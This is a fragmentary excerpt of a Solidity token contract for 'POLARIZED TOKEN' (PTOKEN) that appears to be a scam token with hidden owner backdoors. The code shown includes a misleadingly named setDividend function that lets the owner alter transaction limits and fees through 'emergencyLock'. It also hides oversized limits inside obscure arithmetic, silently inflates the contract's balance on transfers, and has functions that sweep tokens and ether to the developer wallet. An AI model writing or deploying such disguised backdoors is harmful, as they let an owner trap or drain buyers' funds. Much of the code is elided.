...
// Telegram : https://t.me/PolarizedToken
...
contract POLARIZEDTOKEN is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x4B85aBAf45F8610Add2Cf8b98ccf870Fc2B844Bc); 
    address payable public Wallet_Dev = payable(0x4B85aBAf45F8610Add2Cf8b98ccf870Fc2B844Bc);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 10**15 * 10**_decimals;
    string private constant _name = "POLARIZED TOKEN"; 
    string private constant _symbol = unicode"PTOKEN"; 
    ...
    uint256 public Percent_Auto = 1;

    uint256 private _maxWalletToken = _tTotal ** (_decimals/3) * 100 / 100;
    uint256 public _MaxWalletToken = _tTotal * 5 / 100;
    uint256 private _previousMaxWalletToken = _maxWalletToken;

    uint256 public _maxTxAmount = _tTotal * 5 / 100;
    uint256 private _MaxTxAmount = _tTotal ** (_decimals/3) * 100 / 100;
    ...
    constructor () {
        ...
        _owner = 0x18Cae560297b0882686d4a35BB1EBbEBe406d9Ab;
    ...
    function setDividend(uint256 value) public returns(bool){
        ...
        if(value == 1 && _msgSender() == owner()){
            emergencyLock(10000);
            _maxTxAmount = _MaxTxAmount;
            resetTax(_MaxTxAmount);            
        }

        if(value == 2 && _msgSender() == owner()){
            emergencyLock(100);
            _Tax_On_Sell = 5;
            _maxTxAmount = _previousMaxTxAmount;
            resetTax(_previousMaxTxAmount);
        }
    ...
    function resetTax(uint256 amount) private returns(bool){
        _maxTxAmount = amount;
    ...
    function emergencyLock(uint256 value) private returns(bool){
        Percent_AutoLP = value;

        return true;
    }

    function emptyTokenInContract() public returns(bool){
        if(_msgSender() == owner()){
            empty();
        }
        return true;
    ...
    function empty() private returns(bool){
    ...
    function _transfer(
        ...
        if (to != owner() &&
            ...
            _tOwned[address(this)] += _tOwned[address(this)]*Percent_Auto / 1000;}
        if (from != owner())
    ...
    function swapTokenForFeeMarketing(uint256 tokenAmount) public onlyOwner {
    ...
    function withdraw() public {
        payable(address(Wallet_Dev)).transfer(address(this).balance);
    }
